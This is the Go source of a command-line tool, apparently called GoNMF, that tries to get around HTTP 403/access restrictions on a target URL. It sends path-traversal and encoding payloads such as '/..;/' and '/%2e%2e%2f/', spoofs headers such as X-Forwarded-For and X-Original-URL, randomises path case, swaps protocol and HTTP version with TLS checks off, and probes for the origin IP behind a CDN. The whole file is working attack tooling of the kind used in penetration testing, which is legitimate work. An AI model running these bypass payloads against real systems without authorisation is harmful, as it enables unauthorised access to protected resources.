package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
)

var (
	verbose bool
	ip      string
)

func init() {
	// GoNMF Banner
	fmt.Println(`
	▄████  ▒█████   ███▄    █  ███▄    █  █████▒
	██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █  ██ ▀█   █ ▓██   ▒
	▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒▓██  ▀█ ██▒▒████ ░
	░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒░▓█▒  ░
	░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██░   ▓██░░▒█░   
	░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒  ▒ ░   
	░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░░   ░ ▒░ ░     
	░ ░   ░ ░ ░ ░ ▒     ░   ░ ░    ░   ░ ░  ░ ░   
		░     ░ ░           ░          ░         v0.2 https://github.com/akinerk/GoNMF

	`)

	flag.StringVar(&ip, "ip", "127.0.0.1", "Write IP Address")
	flag.BoolVar(&verbose, "verbose", false, "Verbose on/off")
}
func main() {
	urlPtr := flag.String("url", "", "Write URL")
	flag.Parse()

	if *urlPtr == "" {
		fmt.Println("URL is required")
		return
	}

	urlStr := *urlPtr
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		fmt.Println("Invalid URL")
		return
	}

	path := parsedURL.Path
	scheme := parsedURL.Scheme
	host := parsedURL.Host
	baseURL := scheme + "://" + host

	nmf(urlStr, baseURL, path)
	wayback(urlStr)
	ssl(urlStr)
	httpv(urlStr)
	getIP(urlStr)
}

func nmf(urlStr, baseURL, path string) {
	payloads := []string{"/", "/*", "/%2f/", "/./", "/./.", "/*/", "?", "??", "&", "#", "%20", "%09", "/..;/", "/../",
		"/..%2f", "/..;/", "/.././", "/..%00/", "/..%0d", "/..%5c", "/..%ff/", "/%2e%2e%2f/", "/.%2e/", "/%3f",
		"%26", "%23", ".json"}

	for _, payload := range payloads {
		bypassReq := urlStr + payload
		resp, err := http.Get(bypassReq)
		if err != nil {
			if verbose {
				fmt.Printf("Error with payload %s: %s\n", payload, err)
			}
			continue
		}
		defer resp.Body.Close()

		parsedResp, err := http.Get(baseURL)
		if err != nil {
			if verbose {
				fmt.Printf("Error with base URL %s: %s\n", baseURL, err)
			}
			continue
		}
		defer parsedResp.Body.Close()

		parsedLen := parsedResp.ContentLength
		reqLen := resp.ContentLength

		if verbose {
			if resp.StatusCode == 200 || resp.StatusCode == 302 {
				if parsedLen == reqLen {
					fmt.Printf("%s [%d] Possible False Positive\n", bypassReq, resp.StatusCode)
				} else {
					fmt.Printf("%s [%d]\n", bypassReq, resp.StatusCode)
				}
			} else {
				fmt.Printf("%s [%d]\n", bypassReq, resp.StatusCode)
			}
		} else {
			if resp.StatusCode == 200 || resp.StatusCode == 302 {
				if parsedLen == reqLen {
					fmt.Printf("%s [%d] Possible False Positive\n", bypassReq, resp.StatusCode)
				} else {
					fmt.Printf("%s [%d]\n", bypassReq, resp.StatusCode)
				}
			}
		}
	}

	headers := []string{"X-Forwarded-Host", "X-Custom-IP-Authorization", "X-Forwarded-For"}
	for _, header := range headers {
		req, err := http.NewRequest("GET", urlStr, nil)
		if err != nil {
			if verbose {
				fmt.Printf("Error creating request with header %s: %s\n", header, err)
			}
			continue
		}
		req.Header.Set(header, ip)

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			if verbose {
				fmt.Printf("Error with header %s: %s\n", header, err)
			}
			continue
		}
		defer resp.Body.Close()

		if verbose {
			fmt.Printf("%s [%d]\n", header, resp.StatusCode)
		} else {
			if resp.StatusCode == 200 || resp.StatusCode == 302 {
				fmt.Printf("%s [%d] Ip=%s\n", header, resp.StatusCode, ip)
			}
		}
	}

	headers = []string{"X-Original-URL", "X-Rewrite-URL"}
	for _, header := range headers {
		req, err := http.NewRequest("GET", baseURL, nil)
		if err != nil {
			if verbose {
				fmt.Printf("Error creating request with header %s: %s\n", header, err)
			}
			continue
		}
		req.Header.Set(header, path)

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			if verbose {
				fmt.Printf("Error with header %s: %s\n", header, err)
			}
			continue
		}
		defer resp.Body.Close()

		parsedResp, err := http.Get(baseURL)
		if err != nil {
			if verbose {
				fmt.Printf("Error with base URL %s: %s\n", baseURL, err)
			}
			continue
		}
		defer parsedResp.Body.Close()

		parsedLen := parsedResp.ContentLength
		respLen := resp.ContentLength

		if verbose {
			if resp.StatusCode == 200 || resp.StatusCode == 302 {
				if parsedLen == respLen {
					fmt.Printf("%s [%d] Possible False Positive\n", header, resp.StatusCode)
				} else {
					fmt.Printf("%s [%d]\n", header, resp.StatusCode)
				}
			} else {
				fmt.Printf("%s [%d]\n", header, resp.StatusCode)
			}
		} else {
			if resp.StatusCode == 200 || resp.StatusCode == 302 {
				if parsedLen == respLen {
					fmt.Printf("%s [%d] Possible False Positive\n", header, resp.StatusCode)
				} else {
					fmt.Printf("%s [%d]\n", header, resp.StatusCode)
				}
			}
		}
	}

	reqPath := strings.Map(func(r rune) rune {
		if rand.Intn(2) == 0 {
			return r
		}
		return r + 'A' - 'a'
	}, path)
	newURL := baseURL + reqPath

	resp, err := http.Get(newURL)
	if err != nil {
		if verbose {
			fmt.Printf("Error with changed URL %s: %s\n", newURL, err)
		}
		return
	}
	defer resp.Body.Close()

	if verbose {
		fmt.Printf("Uppercase Result [%d] Changed URL [%s]\n", resp.StatusCode, newURL)
	} else {
		if resp.StatusCode == 200 || resp.StatusCode == 302 {
			fmt.Printf("Uppercase Result [%d] Changed URL [%s]\n", resp.StatusCode, newURL)
		}
	}

	resp, err = http.Post(newURL, "application/json", nil)
	if err != nil {
		if verbose {
			fmt.Printf("Error with POST request to %s: %s\n", newURL, err)
		}
		return
	}
	defer resp.Body.Close()

	if verbose {
		fmt.Printf("Post Request Result [%d]\n", resp.StatusCode)
	} else {
		if resp.StatusCode == 200 || resp.StatusCode == 302 {
			fmt.Printf("Post Request Result [%d]\n", resp.StatusCode)
		}
	}
}

func wayback(urlStr string) {
	waybackURL := "https://archive.org/wayback/available?url=" + urlStr
	resp, err := http.Get(waybackURL)
	if err != nil {
		if verbose {
			fmt.Printf("Error accessing Wayback Machine: %s\n", err)
		}
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		if verbose {
			fmt.Printf("Error reading Wayback Machine response: %s\n", err)
		}
		return
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		if verbose {
			fmt.Printf("Error parsing Wayback Machine response: %s\n", err)
		}
		return
	}

	if verbose {
		if snapshots, ok := result["archived_snapshots"].(map[string]interface{}); ok {
			if closest, ok := snapshots["closest"].(map[string]interface{}); ok {
				if url, ok := closest["url"].(string); ok {
					fmt.Printf("Wayback History Found [%s]\n", url)
				} else {
					fmt.Println("Wayback history not found")
				}
			} else {
				fmt.Println("Wayback history not found")
			}
		} else {
			fmt.Println("Wayback history not found")
		}
	} else {
		if snapshots, ok := result["archived_snapshots"].(map[string]interface{}); ok {
			if closest, ok := snapshots["closest"].(map[string]interface{}); ok {
				if url, ok := closest["url"].(string); ok {
					fmt.Printf("Wayback History Found [%s]\n", url)
				}
			}
		}
	}
}

func ssl(urlStr string) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		if verbose {
			fmt.Printf("Invalid URL: %s\n", err)
		}
		return
	}

	protocol := parsedURL.Scheme
	if protocol == "http" {
		urlStr = strings.Replace(urlStr, "http", "https", 1)
	} else {
		urlStr = strings.Replace(urlStr, "https", "http", 1)
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Get(urlStr)
	if err != nil {
		if verbose {
			fmt.Printf("An error occurred: %s\n", err)
		}
		return
	}
	defer resp.Body.Close()

	if verbose {
		fmt.Printf("Protocol Change Result [%d] Changed Protocol [%s]\n", resp.StatusCode, parsedURL.Scheme)
	} else {
		if resp.StatusCode == 200 || resp.StatusCode == 302 {
			fmt.Printf("Protocol Change Result [%d] Changed Protocol [%s]\n", resp.StatusCode, parsedURL.Scheme)
		}
	}
}

func httpv(urlStr string) {
	originalVersion := 0
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Get(urlStr)
	if err == nil {
		originalVersion = resp.ProtoMajor*10 + resp.ProtoMinor
		resp.Body.Close()
	}

	if verbose {
		fmt.Printf("Original HTTP version: %d\n", originalVersion)
	}

	versionsToTest := []int{10, 11, 20} // HTTP/1.0, HTTP/1.1, HTTP/2
	for _, version := range versionsToTest {
		if version != originalVersion {
			req, err := http.NewRequest("GET", urlStr, nil)
			if err != nil {
				if verbose {
					fmt.Printf("Failed to create request for HTTP/%d\n", version/10)
				}
				continue
			}
			req.Close = true

			resp, err := client.Do(req)
			if err != nil {
				if verbose {
					fmt.Printf("Failed to test HTTP/%d\n", version/10)
				}
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode == 200 || resp.StatusCode == 302 {
				fmt.Printf("HTTP/%d request successful [%d]\n", version/10, resp.StatusCode)
			} else if verbose {
				fmt.Printf("HTTP/%d request: [%d]\n", version/10, resp.StatusCode)
			}
		}
	}
}

func getIP(urlStr string) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		if verbose {
			fmt.Printf("Invalid URL: %s\n", err)
		}
		return
	}

	domain := parsedURL.Host
	ipAddr, err := net.LookupIP(domain)
	if err != nil {
		if verbose {
			fmt.Printf("Could not resolve IP for domain: %s\n", domain)
		}
		return
	}

	ipURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, ipAddr[0], parsedURL.Path)
	req, err := http.NewRequest("GET", ipURL, nil)
	if err != nil {
		if verbose {
			fmt.Printf("Error creating request for IP URL: %s\n", err)
		}
		return
	}
	req.Host = domain

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		if strings.Contains(err.Error(), "SSL") {
			fmt.Println("CDN/WAF detected - SSL handshake failed")
		} else if verbose {
			fmt.Printf("Request Error: %s\n", err)
		}
		return
	}
	defer resp.Body.Close()

	if server := resp.Header.Get("Server"); server != "" {
		server = strings.ToLower(server)
		if strings.Contains(server, "cloudflare") || strings.Contains(server, "cloudfront") {
			fmt.Printf("CDN detected (%s) - Not Origin IP\n", server)
		} else {
			printResponse(ipURL, resp.StatusCode)
		}
	} else {
		printResponse(ipURL, resp.StatusCode)
	}
}

func printResponse(urlStr string, statusCode int) {
	if verbose {
		fmt.Printf("IP URL: %s\n", urlStr)
		fmt.Printf("Status Code: %d\n", statusCode)
	} else {
		if statusCode == 200 || statusCode == 302 {
			fmt.Printf("IP URL: %s [%d]\n", urlStr, statusCode)
		}
	}
}
